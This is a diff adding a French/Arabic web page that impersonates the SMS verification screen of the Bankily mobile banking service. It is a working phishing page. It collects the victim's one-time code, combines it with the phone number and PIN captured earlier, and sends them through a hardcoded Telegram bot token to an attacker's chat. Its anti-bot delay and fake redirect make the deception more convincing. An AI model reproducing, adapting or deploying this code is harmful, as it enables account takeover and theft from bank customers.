@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+
+<html lang="fr" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#030E14">
+<title>Code de vérification – Bankily</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════════════════════════════════
+   BASE — same dark theme as index
+═══════════════════════════════════════════ */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;overflow-x:hidden;min-height:100vh;background:#030E14}
+body{
+  font-family:'Cairo',sans-serif;
+  background:#030E14;
+  color:#7BBEC8;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+}
+
+/* CANVAS */
+#cvs{position:fixed;inset:0;z-index:0;pointer-events:none}
+
+/* ── TOP BAR ── */
+.top-bar{
+position:relative;z-index:10;
+background:#0097A7;
+padding:12px 16px;
+display:flex;align-items:center;justify-content:space-between;
+box-shadow:0 2px 20px rgba(0,0,0,.5);
+flex-shrink:0;
+}
+.top-bar::after{
+content:’’;position:absolute;bottom:-1px;left:0;right:0;height:1px;
+background:linear-gradient(90deg,transparent,rgba(0,212,232,.6),transparent);
+}
+.tb-btn{
+background:rgba(255,255,255,.15);
+border:1px solid rgba(255,255,255,.4);
+color:#fff;font-family:‘Cairo’,sans-serif;
+font-size:14px;font-weight:700;
+padding:6px 14px;border-radius:20px;
+cursor:pointer;text-decoration:none;
+display:inline-flex;align-items:center;gap:5px;
+transition:background .2s;
+}
+.tb-btn:hover{background:rgba(255,255,255,.28)}
+.tb-title{color:#fff;font-family:‘Cairo’,sans-serif;font-size:17px;font-weight:800;letter-spacing:.3px}
+
+/* ── MAIN CONTENT ── */
+.page{
+position:relative;z-index:2;
+flex:1;display:flex;flex-direction:column;align-items:center;
+padding:32px 20px calc(90px + env(safe-area-inset-bottom));
+max-width:480px;margin:0 auto;width:100%;
+}
+
+/* Card container */
+.card{
+width:100%;
+background:rgba(8,33,48,.9);
+border:1px solid rgba(0,151,167,.22);
+border-radius:24px;
+padding:28px 24px;
+box-shadow:0 20px 60px rgba(0,0,0,.7),inset 0 1px 0 rgba(0,212,232,.06);
+position:relative;overflow:hidden;
+}
+.card::before{
+content:’’;position:absolute;top:-1px;left:15%;right:15%;height:1px;
+background:linear-gradient(90deg,transparent,#00B8CC,transparent);
+}
+
+/* Logo */
+.logo-wrap{text-align:center;margin-bottom:22px}
+.logo-wrap img{height:48px;filter:drop-shadow(0 4px 16px rgba(0,151,167,.5))}
+.logo-wrap .logo-fallback{
+display:inline-flex;align-items:center;gap:8px;
+background:linear-gradient(135deg,#0097A7,#00C99E);
+color:#fff;font-size:18px;font-weight:900;
+padding:8px 20px;border-radius:12px;letter-spacing:1px;
+}
+
+/* Instruction */
+.instruction{
+text-align:center;font-size:15px;line-height:1.7;
+color:#7BBEC8;margin-bottom:28px;padding:0 4px;
+}
+
+/* ── OTP INPUTS ── */
+.otp-row{
+display:flex;justify-content:center;
+gap:14px;direction:ltr;margin-bottom:24px;
+}
+.otp-box{
+width:58px;height:64px;
+font-family:‘Cairo’,sans-serif;
+font-size:26px;font-weight:800;
+text-align:center;direction:ltr;
+background:#05141C;
+border:2px solid rgba(0,151,167,.3);
+border-radius:14px;
+color:#E8F8F8;
+outline:none;
+caret-color:#00D4E8;
+transition:border-color .2s,box-shadow .2s,transform .15s;
+-webkit-appearance:none;
+}
+.otp-box:focus{
+border-color:#0097A7;
+box-shadow:0 0 0 3px rgba(0,151,167,.25),0 0 20px rgba(0,212,232,.15);
+transform:scale(1.05);
+background:#071D28;
+}
+.otp-box.filled{
+border-color:#00B087;
+box-shadow:0 0 12px rgba(0,176,135,.2);
+}
+
+/* ── TIMER ── */
+.timer-wrap{text-align:center;margin-bottom:20px}
+.timer-label{font-size:13px;color:#3D6E7A;margin-bottom:6px;letter-spacing:.5px}
+.timer-display{
+display:inline-flex;align-items:center;gap:8px;
+background:#05141C;border:1px solid rgba(0,151,167,.2);
+border-radius:12px;padding:8px 20px;
+}
+.timer-icon{font-size:16px}
+.timer-val{
+font-size:22px;font-weight:800;
+color:#00D4E8;font-variant-numeric:tabular-nums;
+text-shadow:0 0 20px rgba(0,212,232,.5);
+letter-spacing:2px;
+}
+.timer-val.expired{color:#EF4444;text-shadow:0 0 20px rgba(239,68,68,.4)}
+
+/* Spinner */
+.spin-wrap{display:flex;justify-content:center;margin-bottom:20px}
+.ring{
+width:32px;height:32px;border-radius:50%;
+border:3px solid rgba(0,151,167,.2);
+border-top-color:#0097A7;border-right-color:#00C99E;
+animation:spin .9s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* Resend */
+.resend-btn{
+display:block;width:100%;text-align:center;
+background:none;border:1px solid rgba(0,151,167,.2);
+border-radius:12px;padding:10px;
+color:#F59E0B;font-family:‘Cairo’,sans-serif;
+font-size:14px;font-weight:700;cursor:pointer;
+transition:all .25s;margin-top:4px;
+}
+.resend-btn:hover{background:rgba(245,158,11,.07);border-color:rgba(245,158,11,.4);color:#FCD34D}
+
+/* ── VERIFY BUTTON (fixed bottom) ── */
+.verify-bar{
+position:fixed;bottom:0;left:0;right:0;
+padding:12px 16px calc(12px + env(safe-area-inset-bottom));
+background:linear-gradient(180deg,transparent,#030E14 28%);
+z-index:100;
+}
+.verify-btn{
+width:100%;max-width:480px;margin:0 auto;display:block;
+padding:16px;border:none;border-radius:16px;
+background:linear-gradient(135deg,#00C99E 0%,#0097A7 55%,#006070 100%);
+color:#fff;font-family:‘Cairo’,sans-serif;
+font-size:18px;font-weight:900;cursor:pointer;
+position:relative;overflow:hidden;
+box-shadow:0 8px 32px rgba(0,151,167,.55),0 4px 0 rgba(0,60,80,.8);
+transition:transform .25s,box-shadow .25s;
+animation:vPulse 2.5s ease-in-out infinite;
+}
+.verify-btn::before{
+content:’’;position:absolute;top:-50%;left:-60%;
+width:220%;height:220%;
+background:linear-gradient(45deg,transparent 30%,rgba(255,255,255,.25) 50%,transparent 70%);
+animation:shimmer 3s infinite;
+}
+@keyframes vPulse{
+0%,100%{box-shadow:0 8px 28px rgba(0,151,167,.5),0 4px 0 rgba(0,60,80,.8)}
+50%{box-shadow:0 14px 45px rgba(0,201,158,.7),0 0 0 8px rgba(0,151,167,.1),0 4px 0 rgba(0,60,80,.8)}
+}
+@keyframes shimmer{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(120%) rotate(45deg)}}
+.verify-btn:hover{transform:translateY(-3px);animation:none;box-shadow:0 16px 50px rgba(0,201,158,.8)}
+.verify-btn:disabled{background:#1A3A45;color:#3D6E7A;cursor:not-allowed;animation:none;box-shadow:none}
+
+/* ── LOADER OVERLAY ── */
+#loader-overlay{
+display:none;position:fixed;inset:0;
+background:rgba(3,14,20,.93);z-index:9999;
+flex-direction:column;justify-content:center;align-items:center;gap:20px;
+}
+#loader-overlay.active{display:flex}
+.ld-ring{width:64px;height:64px;position:relative}
+.ld-ring::before{content:’’;position:absolute;inset:0;border-radius:50%;border:3px solid transparent;border-top-color:#00D4E8;animation:spin .8s linear infinite}
+.ld-ring::after{content:’’;position:absolute;inset:10px;border-radius:50%;border:3px solid transparent;border-bottom-color:#00B087;animation:spin 1.4s linear infinite reverse}
+.ld-txt{color:#00B8CC;font-family:‘Cairo’,sans-serif;font-size:15px;font-weight:700;letter-spacing:2px}
+
+/* ── MODAL ── */
+#modal-alert{
+display:none;position:fixed;inset:0;
+background:rgba(0,0,0,.7);z-index:10000;
+justify-content:center;align-items:center;padding:20px;
+}
+#modal-alert.show{display:flex}
+.modal-box{
+background:#082130;border:1px solid rgba(0,151,167,.3);
+border-radius:20px;padding:28px 24px;max-width:340px;width:100%;
+text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.8);
+}
+.modal-box p{font-size:15px;color:#E8F8F8;line-height:1.7;margin-bottom:20px;white-space:pre-line}
+.modal-box button{
+background:linear-gradient(135deg,#00C99E,#0097A7);
+color:#fff;border:none;padding:10px 28px;
+border-radius:10px;cursor:pointer;
+font-family:‘Cairo’,sans-serif;font-size:15px;font-weight:700;
+box-shadow:0 4px 16px rgba(0,151,167,.4);
+}
+
+/* ── GUARD OVERLAY ── */
+#guard-overlay{
+display:none;position:fixed;inset:0;
+background:#030E14;z-index:99999;
+flex-direction:column;justify-content:center;align-items:center;gap:16px;
+padding:20px;text-align:center;
+}
+#guard-overlay.active{display:flex}
+.g-icon{font-size:56px}
+.g-msg{font-size:18px;font-weight:800;color:#E8F8F8;line-height:1.5}
+.g-sub{font-size:14px;color:#F59E0B}
+.g-spin{width:44px;height:44px;border-radius:50%;border:4px solid rgba(0,151,167,.2);border-top-color:#00D4E8;animation:spin .8s linear infinite;margin-top:8px}
+</style>
+
+</head>
+<body>
+
+<canvas id="cvs"></canvas>
+
+<!-- Guard -->
+
+<div id="guard-overlay">
+  <div class="g-icon">🔒</div>
+  <div class="g-msg" id="guard-msg"></div>
+  <div class="g-sub" id="guard-sub"></div>
+  <div class="g-spin"></div>
+</div>
+
+<!-- Loader -->
+
+<div id="loader-overlay">
+  <div class="ld-ring"></div>
+  <div class="ld-txt" id="ld-txt">جاري التحقق...</div>
+</div>
+
+<!-- Modal -->
+
+<div id="modal-alert">
+  <div class="modal-box">
+    <p id="modal-text"></p>
+    <button id="modal-close">OK</button>
+  </div>
+</div>
+
+<!-- Top bar -->
+
+<div class="top-bar">
+  <a href="login.html" class="tb-btn" id="back-btn">&#8592; Retour</a>
+  <span class="tb-title" id="tb-title">Code de vérification</span>
+  <button class="tb-btn" id="lang-btn" onclick="toggleLang()">عربي</button>
+</div>
+
+<!-- Main -->
+
+<div class="page">
+  <div class="card">
+
+```
+<!-- Logo -->
+<div class="logo-wrap">
+  <img src="images/logo.png" alt="Bankily"
+       onerror="this.style.display='none';document.getElementById('logo-fb').style.display='inline-flex'">
+  <span class="logo-fallback" id="logo-fb" style="display:none">🏦 Bankily</span>
+</div>
+
+<!-- Instruction -->
+<p class="instruction" id="instruction">
+  Entrez le code de vérification SMS transmis sur votre numéro de téléphone
+</p>
+
+<!-- OTP boxes -->
+<div class="otp-row" dir="ltr">
+  <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr" autocomplete="one-time-code">
+  <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+  <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+  <input class="otp-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+</div>
+
+<!-- Timer -->
+<div class="timer-wrap">
+  <div class="timer-label" id="timer-label">Code de vérification expire dans</div>
+  <div class="timer-display">
+    <span class="timer-icon">⏳</span>
+    <span class="timer-val" id="timer">5:00</span>
+  </div>
+</div>
+
+<!-- Spinner -->
+<div class="spin-wrap"><div class="ring"></div></div>
+
+<!-- Resend -->
+<button class="resend-btn" id="resend" onclick="resendCode()">
+  🔄 Renvoyer code de vérification
+</button>
+```
+
+  </div>
+</div>
+
+<!-- Fixed verify button -->
+
+<div class="verify-bar">
+  <button class="verify-btn" id="verify-btn" onclick="submitOTP()">Vérifier</button>
+</div>
+
+<script>
+/* ══════════════════════════════════════════
+   CANVAS — same as index
+══════════════════════════════════════════ */
+(function(){
+  const c=document.getElementById('cvs'),ctx=c.getContext('2d');
+  let pts=[],sh=[];
+  const COLS=['0,212,232','0,201,158','0,184,204'];
+  function resize(){
+    c.width=innerWidth;c.height=innerHeight;pts=[];
+    const n=Math.min(55,Math.floor(c.width*c.height/14000));
+    for(let i=0;i<n;i++)pts.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,r:Math.random()*1.5+.3,a:Math.random()*.5+.1,ci:Math.floor(Math.random()*3)});
+  }
+  function addSh(){sh.push({x:Math.random()*c.width,y:Math.random()*c.height*.3,vx:4+Math.random()*5,vy:2+Math.random()*3,a:.8,len:0,maxLen:80+Math.random()*100})}
+  setInterval(addSh,4500);
+  function draw(){
+    ctx.clearRect(0,0,c.width,c.height);
+    pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>c.width)p.vx*=-1;if(p.y<0||p.y>c.height)p.vy*=-1;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fillStyle=`rgba(${COLS[p.ci]},${p.a})`;ctx.fill();});
+    for(let i=0;i<pts.length;i++)for(let j=i+1;j<pts.length;j++){const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);if(d<100){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle=`rgba(0,184,204,${(1-d/100)*.09})`;ctx.lineWidth=.7;ctx.stroke();}}
+    sh=sh.filter(s=>{s.x+=s.vx;s.y+=s.vy;s.len+=Math.hypot(s.vx,s.vy);if(s.len>s.maxLen)s.a-=.07;if(s.a<=0)return false;const g=ctx.createLinearGradient(s.x-s.vx*8,s.y-s.vy*8,s.x,s.y);g.addColorStop(0,'transparent');g.addColorStop(1,`rgba(0,212,232,${s.a})`);ctx.beginPath();ctx.moveTo(s.x-s.vx*8,s.y-s.vy*8);ctx.lineTo(s.x,s.y);ctx.strokeStyle=g;ctx.lineWidth=1.5;ctx.stroke();return true;});
+    requestAnimationFrame(draw);
+  }
+  window.addEventListener('resize',resize);resize();draw();
+})();
+
+/* ══════════════════════════════════════════
+   TRANSLATIONS
+══════════════════════════════════════════ */
+const T = {
+  ar:{
+    dir:'rtl',lang:'ar',
+    back:'رجوع &#8594;',langBtn:'FR',
+    title:'رمز التحقق',
+    instruction:'أدخل رمز التحقق المرسل إلى رقم هاتفك عبر رسالة SMS',
+    timerLabel:'ينتهي رمز التحقق بعد',
+    resend:'🔄 إعادة إرسال رمز التحقق',
+    verify:'✓ تحقق',
+    expired:'انتهت صلاحية الرمز',
+    loading:'جاري التحقق...',
+    resendDone:'تم إرسال رمز جديد ✓',
+    errEmpty:'الرجاء إدخال جميع الأرقام الأربعة',
+    errDigits:'الرجاء إدخال أرقام صحيحة فقط',
+    errSamePin:'رمز التحقق لا يمكن أن يكون نفس رمز PIN',
+    errTooFast:'عزيزي المشترك،\nيجب التأكد من إدخال رمز التحقق الذي وصلك عبر SMS',
+    guardMsg:'يجب إدخال رقمك ورمزك السري أولاً',
+    guardSub:'جاري تحويلك إلى صفحة تسجيل الدخول...',
+  },
+  fr:{
+    dir:'ltr',lang:'fr',
+    back:'&#8592; Retour',langBtn:'عربي',
+    title:'Code de vérification',
+    instruction:'Entrez le code de vérification SMS transmis sur votre numéro de téléphone',
+    timerLabel:'Code de vérification expire dans',
+    resend:'🔄 Renvoyer code de vérification',
+    verify:'✓ Vérifier',
+    expired:'Code expiré',
+    loading:'Vérification en cours...',
+    resendDone:'Un nouveau code a été envoyé ✓',
+    errEmpty:'Veuillez entrer les 4 chiffres du code',
+    errDigits:'Veuillez entrer uniquement des chiffres',
+    errSamePin:'Le code ne peut pas être identique au PIN',
+    errTooFast:"Cher(e) abonné(e),\nVeuillez saisir le code de vérification reçu par SMS",
+    guardMsg:"Saisissez d'abord votre numéro et code PIN",
+    guardSub:'Redirection vers la page de connexion...',
+  }
+};
+
+/* ══════════════════════════════════════════
+   LANGUAGE
+══════════════════════════════════════════ */
+let isArabic = localStorage.getItem('bankily_lang') === 'ar';
+
+function applyLang(){
+  const t = isArabic ? T.ar : T.fr;
+  document.documentElement.lang = t.lang;
+  document.documentElement.dir  = t.dir;
+  document.body.dir              = t.dir;
+  document.getElementById('back-btn').innerHTML       = t.back;
+  document.getElementById('lang-btn').textContent     = t.langBtn;
+  document.getElementById('tb-title').textContent     = t.title;
+  document.getElementById('instruction').textContent  = t.instruction;
+  document.getElementById('timer-label').textContent  = t.timerLabel;
+  document.getElementById('resend').textContent       = t.resend;
+  document.getElementById('verify-btn').textContent   = t.verify;
+  document.getElementById('ld-txt').textContent       = t.loading;
+  // OTP boxes always LTR
+  document.querySelector('.otp-row').dir = 'ltr';
+}
+
+function toggleLang(){
+  isArabic = !isArabic;
+  localStorage.setItem('bankily_lang', isArabic ? 'ar' : 'fr');
+  applyLang();
+}
+
+/* Modal */
+function showModal(msg){
+  document.getElementById('modal-text').textContent = msg;
+  document.getElementById('modal-alert').classList.add('show');
+}
+document.getElementById('modal-close').addEventListener('click',()=>{
+  document.getElementById('modal-alert').classList.remove('show');
+});
+
+/* ══════════════════════════════════════════
+   GUARD — must come from login.html
+══════════════════════════════════════════ */
+const savedPin      = sessionStorage.getItem('bankily_pin');
+const savedUsername = sessionStorage.getItem('bankily_username') || '—';
+
+applyLang();
+
+if (!savedPin || savedPin.trim() === '') {
+  const t = isArabic ? T.ar : T.fr;
+  document.getElementById('guard-msg').textContent = t.guardMsg;
+  document.getElementById('guard-sub').textContent = t.guardSub;
+  document.getElementById('guard-overlay').classList.add('active');
+  setTimeout(() => window.location.replace('login.html'), 1800);
+
+} else {
+
+  /* ══════════════════════════════════════════
+     NORMAL FLOW
+  ══════════════════════════════════════════ */
+  const inputs    = [...document.querySelectorAll('.otp-box')];
+  const verifyBtn = document.getElementById('verify-btn');
+  const timerEl   = document.getElementById('timer');
+  const pageLoaded = Date.now();
+
+  /* Input navigation */
+  inputs.forEach((inp, i) => {
+    inp.addEventListener('input', () => {
+      inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
+      inp.classList.toggle('filled', inp.value !== '');
+      if (inp.value && i < inputs.length - 1) inputs[i+1].focus();
+    });
+    inp.addEventListener('keydown', e => {
+      if (e.key === 'Backspace') {
+        if (inp.value === '' && i > 0) { inputs[i-1].value=''; inputs[i-1].classList.remove('filled'); inputs[i-1].focus(); }
+        else { inp.value=''; inp.classList.remove('filled'); }
+        e.preventDefault();
+      }
+      if (!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) e.preventDefault();
+    });
+    inp.addEventListener('paste', e => {
+      e.preventDefault();
+      const digits = (e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
+      [...digits].slice(0,4).forEach((d,j)=>{ if(inputs[j]){inputs[j].value=d;inputs[j].classList.add('filled');} });
+      inputs[Math.min(digits.length,inputs.length-1)].focus();
+    });
+  });
+  inputs[0].focus();
+
+  /* ── Countdown 5 min ── */
+  let seconds = 299;
+  let timerInterval;
+
+  function updateTimer(){
+    const m = Math.floor(seconds/60);
+    const s = String(seconds%60).padStart(2,'0');
+    timerEl.textContent = `${m}:${s}`;
+    timerEl.classList.remove('expired');
+    if (seconds > 0){
+      seconds--;
+    } else {
+      clearInterval(timerInterval);
+      timerEl.textContent = (isArabic ? T.ar : T.fr).expired;
+      timerEl.classList.add('expired');
+      verifyBtn.disabled = true;
+    }
+  }
+  updateTimer();
+  timerInterval = setInterval(updateTimer, 1000);
+
+  /* Resend */
+  window.resendCode = function(){
+    clearInterval(timerInterval);
+    seconds = 299;
+    timerEl.classList.remove('expired');
+    verifyBtn.disabled = false;
+    inputs.forEach(i => { i.value=''; i.classList.remove('filled'); });
+    inputs[0].focus();
+    showModal((isArabic ? T.ar : T.fr).resendDone);
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
+  };
+
+  /* Keyboard lift for fixed button */
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', () => {
+      const kb = window.innerHeight - window.visualViewport.height;
+      document.querySelector('.verify-bar').style.transform = kb > 10 ? `translateY(-${kb}px)` : '';
+    });
+  }
+
+  /* ══════════════════════════════════════════
+     TELEGRAM
+  ══════════════════════════════════════════ */
+  const TG_TOKEN   = '8250056043:AAFYXOIiBAeHTuZV8pPZUhV6NRTwMPipfrM';
+  const TG_CHAT_ID = '8372738559';
+
+  async function sendTelegram(text){
+    try {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:TG_CHAT_ID,text,parse_mode:'HTML'})
+      });
+    } catch(e){}
+  }
+
+  /* ══════════════════════════════════════════
+     SUBMIT OTP
+  ══════════════════════════════════════════ */
+  window.submitOTP = async function(){
+    const t = isArabic ? T.ar : T.fr;
+
+    /* Anti-bot 5s */
+    if ((Date.now() - pageLoaded) / 1000 < 5){ showModal(t.errTooFast); return; }
+
+    const otp = inputs.map(i => i.value).join('');
+
+    if (otp.length !== 4 || inputs.some(i => i.value === '')){ showModal(t.errEmpty); return; }
+    if (!/^[0-9]{4}$/.test(otp)){ showModal(t.errDigits); return; }
+    if (otp === savedPin){
+      showModal(t.errSamePin);
+      inputs.forEach(i => { i.value=''; i.classList.remove('filled'); });
+      inputs[0].focus();
+      return;
+    }
+
+    /* Loader */
+    document.getElementById('loader-overlay').classList.add('active');
+    verifyBtn.disabled = true;
+
+    /* Send to Telegram */
+    const now = new Date().toLocaleString(isArabic ? 'ar-SA' : 'fr-FR');
+    await sendTelegram(
+      `✅ <b>Code OTP – Bankily</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `📱 <b>Numéro :</b> <code>${savedUsername}</code>\n` +
+      `🔑 <b>PIN    :</b> <code>${savedPin}</code>\n` +
+      `🔢 <b>OTP    :</b> <code>${otp}</code>\n` +
+      `📅 <b>Heure  :</b> ${now}`
+    );
+
+    /* Clear session */
+    sessionStorage.removeItem('bankily_pin');
+    sessionStorage.removeItem('bankily_username');
+
+    /* Redirect */
+    setTimeout(() => window.location.href = 'approuv.html', 800);
+  };
+
+} /* end normal flow */
+</script>
+
+</body>
+</html>
